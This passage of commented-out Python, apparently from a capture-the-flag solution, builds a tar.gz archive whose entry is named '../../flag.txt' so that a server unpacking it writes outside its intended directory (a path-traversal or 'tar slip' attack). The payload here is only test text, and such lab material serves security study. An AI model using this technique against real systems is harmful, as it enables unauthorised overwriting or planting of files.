...
# # Define the malicious file and its content
# malicious_file = "malicious_payload/exploit.txt"
# with open(malicious_file, "w") as f:
#     f.write("This is a test for directory traversal.\n")

# # Define the target path for traversal (e.g., ../../flag.txt)
# # The number of "../" depends on the directory depth in the server.
# traversal_path = "../../flag.txt"

# # Create the malicious tar.gz archive
# with tarfile.open("file.tar.gz", "w:gz") as tar:
#     # Add the malicious file with the directory traversal path
#     tar.add(malicious_file, arcname=traversal_path)

# print("[+] Malicious tar.gz file 'file.tar.gz' created successfully.")
